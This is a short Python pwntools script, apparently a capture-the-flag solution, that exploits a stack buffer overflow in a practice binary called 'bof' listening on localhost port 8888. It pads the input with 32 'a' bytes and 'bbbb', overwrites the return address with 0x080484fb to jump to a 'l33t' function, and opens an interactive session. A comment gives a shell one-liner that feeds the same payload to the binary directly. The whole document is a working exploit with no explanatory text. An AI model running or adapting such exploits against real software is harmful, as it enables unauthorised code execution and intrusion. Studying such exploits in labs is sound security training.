#!/usr/bin/env python
# -*- coding:UTF-8 -*-

from pwn import *

host="127.0.0.1"
port=8888

r=remote(host, port)

# l33t address : 080484fb
l33t = 0x080484fb
# echo -ne "aaaabaaacaaadaaaeaaafaaagaaahaaa\xfb\x84\x04\x08" > exp
# cat exp - | ./bof
payload = 'a'*32+'bbbb'
payload += p32(l33t)
#
r.recvuntil("Read your input :")
raw_input("dada")
r.sendline(payload)

r.interactive()

